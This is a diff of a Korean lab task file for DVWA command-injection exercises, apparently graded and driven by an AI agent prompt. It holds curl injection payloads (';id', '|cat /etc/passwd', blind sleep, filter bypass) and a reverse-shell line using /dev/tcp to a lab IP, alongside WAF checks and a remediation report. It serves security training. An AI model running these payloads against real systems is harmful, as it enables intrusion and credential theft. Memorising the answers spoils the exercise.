@@ -19,7 +19,8 @@ steps:
     전송하세요.
   category: recon
   points: 8
-  answer: "curl -s -c /tmp/dvwa_cmd.txt \\\n  -d 'username=admin&password=password&Login=Login'\
+  answer: "\U0001F916 프롬프트: DVWA(:8080)에 로그인하고 Command Injection 페이지에 정상적인 ping 요청을\
+    \ 보내 기능을 확인해줘\n\U0001F4CE 참고 (CLI): curl -s -c /tmp/dvwa_cmd.txt \\\n  -d 'username=admin&password=password&Login=Login'\
     \ http://10.20.30.80:8080/login.php -L > /dev/null && curl -s -b /tmp/dvwa_cmd.txt\
     \ -b 'security=low' \\\n  -d 'ip=127.0.0.1&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
     \ \\\n | grep -oE 'PING|bytes from|ttl=' | head -5"
@@ -41,9 +42,10 @@ steps:
   hint: curl -d 'ip=127.0.0.1;+id&Submit=Submit' 형태로 POST하세요. security=low 쿠키 필요.
   category: exploit
   points: 12
-  answer: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' \\\n  -d 'ip=127.0.0.1;+id&Submit=Submit'\
-    \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep -oP 'uid=\\d+\\([^)]+\\\
-    )'"
+  answer: "\U0001F916 프롬프트: 세미콜론(;)을 이용한 명령어 주입을 수행하시오. 127.0.0.1 뒤에 세미콜론으로 id 명령을\
+    \ 연결해줘\n\U0001F4CE 참고 (CLI): curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' \\\
+    \n  -d 'ip=127.0.0.1;+id&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
+    \ \\\n | grep -oP 'uid=\\d+\\([^)]+\\)'"
   answer_detail: 세미콜론(;)은 리눅스에서 명령어를 순차적으로 실행합니다. 앞의 ping 명령과 관계없이 id 명령이 실행됩니다. uid=33(www-data)가
     출력되면 웹 서버 프로세스 권한으로 명령이 실행된 것입니다.
   verify:
@@ -61,9 +63,10 @@ steps:
   hint: ip 파라미터에 '| cat /etc/passwd'를 넣으세요. 파이프 앞의 명령 없이 단독으로 뒤 명령만 실행됩니다.
   category: exploit
   points: 12
-  answer: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' \\\n  -d 'ip=|+cat+/etc/passwd&Submit=Submit'\
-    \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep -E 'root|www-data|sshd'\
-    \ | head -5"
+  answer: "\U0001F916 프롬프트: 파이프(|)를 이용한 명령어 주입을 수행하시오. cat /etc/passwd로 시스템 사용자 목록을\
+    \ 확인해줘\n\U0001F4CE 참고 (CLI): curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' \\\
+    \n  -d 'ip=|+cat+/etc/passwd&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
+    \ \\\n | grep -E 'root|www-data|sshd' | head -5"
   answer_detail: 파이프(|)는 앞 명령의 출력을 뒤 명령의 입력으로 전달합니다. 단독으로 사용하면 앞 명령 없이 뒤 명령만 실행됩니다.
     root:x:0:0이 출력되면 /etc/passwd 읽기에 성공한 것입니다.
   verify:
@@ -81,7 +84,9 @@ steps:
   hint: ip 파라미터에 '127.0.0.1 && whoami'를 넣으세요. &&는 URL 인코딩(%26%26)이 필요합니다.
   category: exploit
   points: 10
-  answer: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' \\\n  -d 'ip=127.0.0.1+%26%26+whoami+%26%26+ip+addr+show+eth0&Submit=Submit'\
+  answer: "\U0001F916 프롬프트: AND(&&) 연산자를 이용한 명령어 주입을 수행하시오. ping이 성공한 후 whoami와 네트워크\
+    \ 정보를 확인해줘\n\U0001F4CE 참고 (CLI): curl -s -b /tmp/dvwa_cmd.txt -b 'security=low'\
+    \ \\\n  -d 'ip=127.0.0.1+%26%26+whoami+%26%26+ip+addr+show+eth0&Submit=Submit'\
     \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep -E 'www-data|inet\
     \ ' | head -5"
   answer_detail: '&&(AND)는 첫 번째 명령이 성공(exit code 0)해야 두 번째 명령이 실행됩니다. &는 URL에서 파라미터
@@ -101,7 +106,8 @@ steps:
   hint: ip 파라미터에 '127.0.0.1; echo HOSTNAME=$(cat /etc/hostname)'를 넣으세요.
   category: exploit
   points: 10
-  answer: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' --data-urlencode 'ip=127.0.0.1;\
+  answer: "\U0001F916 프롬프트: 백틱(`)과 $() 명령 치환을 이용한 명령어 주입을 수행해줘\n\U0001F4CE 참고 (CLI):\
+    \ curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' --data-urlencode 'ip=127.0.0.1;\
     \ echo CMDI_HOSTNAME=$(cat /etc/hostname)' \\\n  -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
     \ \\\n | grep 'CMDI_HOSTNAME'"
   answer_detail: 백틱(`)이나 $()은 명령 치환(command substitution)으로, 내부 명령의 실행 결과가 외부 명령의
@@ -123,9 +129,10 @@ steps:
     형태입니다.
   category: exploit
   points: 12
-  answer: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=medium' \\\n  -d 'ip=|+id&Submit=Submit'\
-    \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep -oP 'uid=\\d+\\([^)]+\\\
-    )'"
+  answer: "\U0001F916 프롬프트: DVWA의 Medium 보안 레벨에서 명령어 주입 필터를 우회하시오. Medium에서는 &&와 ;가\
+    \ 필터링되지만 파이프(|)는 허용된다해줘\n\U0001F4CE 참고 (CLI): curl -s -b /tmp/dvwa_cmd.txt -b\
+    \ 'security=medium' \\\n  -d 'ip=|+id&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
+    \ \\\n | grep -oP 'uid=\\d+\\([^)]+\\)'"
   answer_detail: Medium 레벨은 str_replace로 '&&'와 ';'만 필터링합니다. 파이프(|), OR(||), 줄바꿈(%0a),
     백틱(`) 등은 여전히 사용 가능합니다. 블랙리스트 필터링의 한계를 보여줍니다.
   verify:
@@ -146,7 +153,10 @@ steps:
     3초 이상이면 명령이 실행된 것입니다.
   category: exploit
   points: 10
-  answer: 'echo ''=== Normal Request ==='' && curl -s -o /dev/null -b /tmp/dvwa_cmd.txt
+  answer: '🤖 프롬프트: 시간 기반 Blind Command Injection을 테스트하시오. sleep 명령으로 응답 지연을 유발하여 명령
+    실행을 확인해줘
+
+    📎 참고 (CLI): echo ''=== Normal Request ==='' && curl -s -o /dev/null -b /tmp/dvwa_cmd.txt
     -b ''security=low'' -d ''ip=127.0.0.1&Submit=Submit'' -w ''Time: %{time_total}s''
     http://10.20.30.80:8080/vulnerabilities/exec/ && echo '''' && echo ''=== Sleep
     Injection ==='' && curl -s -o /dev/null -b /tmp/dvwa_cmd.txt -b ''security=low''
@@ -174,7 +184,9 @@ steps:
   hint: bash -i >& /dev/tcp/10.20.30.201/4444 0>&1 형태의 리버스 쉘 페이로드입니다.
   category: exploit
   points: 8
-  answer: 'cat > /tmp/revshell_payload.txt << ''SHELLEOF''
+  answer: '🤖 프롬프트: 리버스 쉘 페이로드를 작성하시오(실행 금지) 구현 방법과 예시를 설명해줘
+
+    📎 참고 (CLI): cat > /tmp/revshell_payload.txt << ''SHELLEOF''
 
     === Reverse Shell Payloads (학습 목적 - 실행 금지) ===
 
@@ -215,11 +227,13 @@ steps:
   hint: 같은 '; id' 페이로드를 포트 80과 포트 8080에 각각 전송하여 응답 코드(200 vs 403)를 비교하세요.
   category: defense
   points: 10
-  answer: echo '=== DVWA Direct (포트 8080) ===' && curl -s -b /tmp/dvwa_cmd.txt -b
-    'security=low' -d 'ip=127.0.0.1;+id&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/
-    | grep -oP 'uid=[^ ]+' | head -1 && echo '=== ModSecurity WAF (포트 80) ===' &&
-    curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?cmd=;id' &&
-    echo '' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?input=127.0.0.1%7Ccat%20/etc/passwd'
+  answer: '🤖 프롬프트: ModSecurity WAF가 명령어 주입을 차단하는지 검증해줘
+
+    📎 참고 (CLI): echo ''=== DVWA Direct (포트 8080) ==='' && curl -s -b /tmp/dvwa_cmd.txt
+    -b ''security=low'' -d ''ip=127.0.0.1;+id&Submit=Submit'' http://10.20.30.80:8080/vulnerabilities/exec/
+    | grep -oP ''uid=[^ ]+'' | head -1 && echo ''=== ModSecurity WAF (포트 80) ===''
+    && curl -s -o /dev/null -w ''HTTP:%{http_code}'' ''http://10.20.30.80:80/?cmd=;id''
+    && echo '''' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' ''http://10.20.30.80:80/?input=127.0.0.1%7Ccat%20/etc/passwd'''
   answer_detail: ModSecurity OWASP CRS의 REQUEST-932 시리즈는 OS 명령어 패턴(;, |, &&와 id, cat,
     whoami 등의 조합)을 탐지합니다. WAF가 적용된 포트 80에서는 403이 반환되고, 직접 접근 시에는 명령이 실행됩니다. 다층 방어(WAF
     + 입력 검증 + escapeshellcmd())가 필요합니다.
@@ -241,13 +255,14 @@ steps:
   hint: echo 명령으로 /tmp/cmdi_report.txt에 구조화된 보고서를 작성하세요.
   category: reporting
   points: 8
-  answer: "cat > /tmp/cmdi_report.txt << 'EOF'\n=== 명령 주입 취약점 진단 보고서 ===\n대상: DVWA\
-    \ (10.20.30.80:8080)\n\n[메타문자 테스트 결과]\n  ; (세미콜론)  : Low 성공, Medium 필터링\n  | (파이프)\
-    \    : Low/Medium 모두 성공\n  && (AND)      : Low 성공, Medium 필터링\n  $() (치환)    :\
-    \ Low 성공\n  sleep (Blind) : Low 성공 (3초 지연)\n\n[WAF 차단 결과]\n  ModSecurity (포트 80):\
-    \ 932xxx 룰로 차단 (403)\n  직접 접근 (포트 8080): 차단 없음\n\n[방어 권고]\n  1. escapeshellcmd()/escapeshellarg()\
-    \ 적용\n  2. 입력값 화이트리스트 (IP 형식만 허용)\n  3. shell_exec() 대신 안전한 API 사용\n  4. WAF 룰\
-    \ 전 포트에 적용\nEOF\ncat /tmp/cmdi_report.txt"
+  answer: "\U0001F916 프롬프트: 명령 주입 진단 결과를 정리하시오 구현 방법과 예시를 설명해줘\n\U0001F4CE 참고 (CLI):\
+    \ cat > /tmp/cmdi_report.txt << 'EOF'\n=== 명령 주입 취약점 진단 보고서 ===\n대상: DVWA (10.20.30.80:8080)\n\
+    \n[메타문자 테스트 결과]\n  ; (세미콜론)  : Low 성공, Medium 필터링\n  | (파이프)    : Low/Medium 모두\
+    \ 성공\n  && (AND)      : Low 성공, Medium 필터링\n  $() (치환)    : Low 성공\n  sleep (Blind)\
+    \ : Low 성공 (3초 지연)\n\n[WAF 차단 결과]\n  ModSecurity (포트 80): 932xxx 룰로 차단 (403)\n\
+    \  직접 접근 (포트 8080): 차단 없음\n\n[방어 권고]\n  1. escapeshellcmd()/escapeshellarg() 적용\n\
+    \  2. 입력값 화이트리스트 (IP 형식만 허용)\n  3. shell_exec() 대신 안전한 API 사용\n  4. WAF 룰 전 포트에\
+    \ 적용\nEOF\ncat /tmp/cmdi_report.txt"
   answer_detail: 명령 주입 방어의 핵심은 사용자 입력을 OS 명령에 직접 전달하지 않는 것입니다. 불가피한 경우 escapeshellcmd()/escapeshellarg()
     사용, 화이트리스트 검증, WAF 적용이 필요합니다.
   verify:
@@ -286,7 +301,17 @@ steps:
     field: stdout
   target_vm: attacker
   risk_level: low
-  answer: ''
+  answer: '🤖 프롬프트: 다음 작업들을 순서대로 수행해줘:
+
+    1) DVWA(:8080)에 로그인하고 Command Injection 페이지에 정상적인 ping 요청을 보내 기능을 확인해줘
+
+    2) 세미콜론(;)을 이용한 명령어 주입을 수행하시오. 127.0.0.1 뒤에 세미콜론으로 id 명령을 연결해줘
+
+    3) 파이프(|)를 이용한 명령어 주입을 수행하시오. cat /etc/passwd로 시스템 사용자 목록을 확인해줘
+
+    4) AND(&&) 연산자를 이용한 명령어 주입을 수행하시오. ping이 성공한 후 whoami와 네트워크 정보를 확인해줘
+
+    5) 백틱(`)과 $() 명령 치환을 이용한 명령어 주입을 수행해줘'
   answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
     다단계 작업.
   script: ''
